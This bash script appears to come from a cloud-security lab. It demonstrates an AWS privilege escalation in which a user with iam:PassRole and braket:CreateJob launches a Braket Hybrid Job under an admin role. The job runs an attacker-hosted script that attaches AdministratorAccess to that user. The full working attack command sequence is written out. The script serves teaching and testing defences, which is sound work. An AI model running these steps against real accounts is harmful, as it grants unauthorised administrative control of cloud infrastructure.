#!/bin/bash

# Demo script for iam:PassRole + braket:CreateJob privilege escalation
# This scenario demonstrates how a user with iam:PassRole and braket:CreateJob
# can escalate privileges by creating a Braket Hybrid Job with an admin execution
# role. The job runs a malicious Python script that attaches AdministratorAccess
# to the starting user, granting full admin access.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-braket-001-to-admin-starting-user"
ADMIN_ROLE_NAME="pl-prod-braket-001-to-admin-admin-role"
JOB_NAME="pl-prod-braket-001-to-admin-privesc-job"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Braket CreateJob Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_braket_001_iam_passrole_braket_createjob.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Retrieve readonly credentials for observation steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Extract scenario resource details from grouped output
ADMIN_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_arn')
ADMIN_ROLE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_name')
ATTACKER_BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.attacker_bucket_name')
STARTING_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_name')

# Get region - Braket is only available in select regions, us-east-1 is the primary
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Admin Role ARN: $ADMIN_ROLE_ARN"
echo "Attacker Bucket: $ATTACKER_BUCKET_NAME"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# [EXPLOIT] Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# [OBSERVATION] Verify starting user identity
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Arn' --output text"
use_readonly_creds
READONLY_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "ReadOnly identity: $READONLY_IDENTITY"

use_starting_creds
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [OBSERVATION] Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying starting user doesn't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Show pre-staged exploit artifact
echo -e "${YELLOW}Step 5: Retrieving pre-staged exploit artifact location${NC}"
echo ""
echo -e "${BLUE}ℹ Attack Simulation Note:${NC}"
echo -e "${BLUE}  The malicious Python exploit script has been pre-staged in an attacker-controlled${NC}"
echo -e "${BLUE}  S3 bucket by Terraform. In a real attack, the attacker would host this exploit on${NC}"
echo -e "${BLUE}  their own infrastructure. The bucket policy grants the prod account read access${NC}"
echo -e "${BLUE}  (via resource policy, not IAM). If an attacker account is configured, this bucket${NC}"
echo -e "${BLUE}  lives in a separate AWS account.${NC}"
echo ""
echo "Attacker Bucket: $ATTACKER_BUCKET_NAME"
echo "Exploit Script: s3://${ATTACKER_BUCKET_NAME}/exploit/exploit.py"
echo -e "${GREEN}✓ Exploit artifact pre-staged by Terraform${NC}\n"

# [EXPLOIT] Step 6: Create Braket Hybrid Job (PRIVILEGE ESCALATION)
use_starting_creds
echo -e "${YELLOW}Step 6: Creating Braket Hybrid Job with admin execution role${NC}"
echo "This is the privilege escalation vector - creating a Braket job that will"
echo "run our malicious script with the admin role's credentials."
echo ""
echo "Job Name: $JOB_NAME"
echo "Execution Role: $ADMIN_ROLE_ARN"
echo "Device: Amazon SV1 Quantum Simulator"
echo "Entry Point: exploit:main"
echo "Source: s3://${ATTACKER_BUCKET_NAME}/exploit/exploit.py"

show_attack_cmd "Attacker" "aws braket create-job --job-name $JOB_NAME --role-arn $ADMIN_ROLE_ARN --algorithm-specification '{\"scriptModeConfig\":{\"entryPoint\":\"exploit:main\",\"s3Uri\":\"s3://${ATTACKER_BUCKET_NAME}/exploit/exploit.py\",\"compressionType\":\"NONE\"}}' --output-data-config '{\"s3Path\":\"s3://${ATTACKER_BUCKET_NAME}/exploit/output\"}' --instance-config '{\"instanceType\":\"ml.m5.large\",\"instanceCount\":1,\"volumeSizeInGb\":1}' --device-config '{\"device\":\"arn:aws:braket:::device/quantum-simulator/amazon/sv1\"}' --hyper-parameters '{\"ATTACKER_USER\":\"${STARTING_USER_NAME}\"}' --stopping-condition '{\"maxRuntimeInSeconds\":300}' --region $AWS_REGION"

JOB_RESULT=$(aws braket create-job \
    --job-name "$JOB_NAME" \
    --role-arn "$ADMIN_ROLE_ARN" \
    --algorithm-specification '{
        "scriptModeConfig": {
            "entryPoint": "exploit:main",
            "s3Uri": "s3://'"${ATTACKER_BUCKET_NAME}"'/exploit/exploit.py",
            "compressionType": "NONE"
        }
    }' \
    --output-data-config '{
        "s3Path": "s3://'"${ATTACKER_BUCKET_NAME}"'/exploit/output"
    }' \
    --instance-config '{
        "instanceType": "ml.m5.large",
        "instanceCount": 1,
        "volumeSizeInGb": 1
    }' \
    --device-config '{
        "device": "arn:aws:braket:::device/quantum-simulator/amazon/sv1"
    }' \
    --hyper-parameters '{"ATTACKER_USER": "'"${STARTING_USER_NAME}"'"}' \
    --stopping-condition '{"maxRuntimeInSeconds": 300}' \
    --region $AWS_REGION \
    --output json 2>&1)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to create Braket Hybrid Job${NC}"
    echo "$JOB_RESULT"
    exit 1
fi

JOB_ARN=$(echo "$JOB_RESULT" | jq -r '.jobArn')
echo ""
echo "Job ARN: $JOB_ARN"
echo -e "${GREEN}✓ Braket Hybrid Job created successfully${NC}\n"

# [OBSERVATION] Step 7: Poll for job completion
use_readonly_creds
echo -e "${YELLOW}Step 7: Waiting for Braket Hybrid Job to complete${NC}"
echo "The job needs to provision a container, run the exploit, and terminate."
echo "This typically takes 3-5 minutes. Polling every 15 seconds..."
echo ""

MAX_WAIT=360  # 6 minutes
ELAPSED=0
POLL_INTERVAL=15

while [ $ELAPSED -lt $MAX_WAIT ]; do
    show_cmd "ReadOnly" "aws braket get-job --job-arn $JOB_ARN --region $AWS_REGION --query 'status' --output text"
    JOB_STATUS=$(aws braket get-job \
        --job-arn "$JOB_ARN" \
        --region $AWS_REGION \
        --query 'status' \
        --output text 2>/dev/null)

    echo "  Status: $JOB_STATUS (elapsed: ${ELAPSED}s)"

    if [ "$JOB_STATUS" == "COMPLETED" ]; then
        echo ""
        echo -e "${GREEN}✓ Braket Hybrid Job completed successfully${NC}\n"
        break
    elif [ "$JOB_STATUS" == "FAILED" ] || [ "$JOB_STATUS" == "CANCELLED" ]; then
        echo ""
        echo -e "${RED}Error: Braket job ended with status: $JOB_STATUS${NC}"

        # Get failure reason
        FAILURE_REASON=$(aws braket get-job \
            --job-arn "$JOB_ARN" \
            --region $AWS_REGION \
            --query 'failureReason' \
            --output text 2>/dev/null)

        if [ -n "$FAILURE_REASON" ] && [ "$FAILURE_REASON" != "None" ]; then
            echo "Failure reason: $FAILURE_REASON"
        fi

        exit 1
    fi

    sleep $POLL_INTERVAL
    ELAPSED=$((ELAPSED + POLL_INTERVAL))
done

if [ $ELAPSED -ge $MAX_WAIT ]; then
    echo -e "${RED}Error: Timed out waiting for Braket job to complete after ${MAX_WAIT}s${NC}"
    echo "The job may still be running. Check the AWS Console for status."
    echo "Job ARN: $JOB_ARN"
    exit 1
fi

# Step 8: Wait for IAM policy propagation
echo -e "${YELLOW}Step 8: Waiting for IAM policy to propagate${NC}"
echo "IAM changes can take time to propagate..."
sleep 15
echo -e "${GREEN}✓ Policy should be propagated${NC}\n"

# [OBSERVATION] Step 9: Verify administrator access
use_readonly_creds
echo -e "${YELLOW}Step 9: Verifying administrator access${NC}"
echo "Checking that AdministratorAccess was attached to our user..."

show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER_NAME --output table"
aws iam list-attached-user-policies --user-name $STARTING_USER_NAME --output table

echo ""
echo "Attempting to list IAM users with readonly credentials..."

show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    echo -e "${YELLOW}Note: IAM propagation can take longer than expected. Try waiting 30 more seconds and test again.${NC}"
fi
echo ""

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER_NAME (with iam:PassRole + braket:CreateJob)"
echo "2. Used pre-staged malicious Python exploit from attacker-controlled S3 bucket"
echo "3. Created Braket Hybrid Job with admin execution role: $ADMIN_ROLE_NAME"
echo "4. Job ran exploit script which attached AdministratorAccess to starting user"
echo "5. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER_NAME → (iam:PassRole + braket:CreateJob)"
echo -e "  → Braket Job with $ADMIN_ROLE_NAME (exploit from s3://${ATTACKER_BUCKET_NAME}/)"
echo -e "  → (iam:AttachUserPolicy) → AdministratorAccess → Admin"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Attached policy: AdministratorAccess on $STARTING_USER_NAME"
echo "- Braket job: $JOB_ARN"

echo -e "\n${RED}⚠ Warning: AdministratorAccess policy is attached to $STARTING_USER_NAME${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
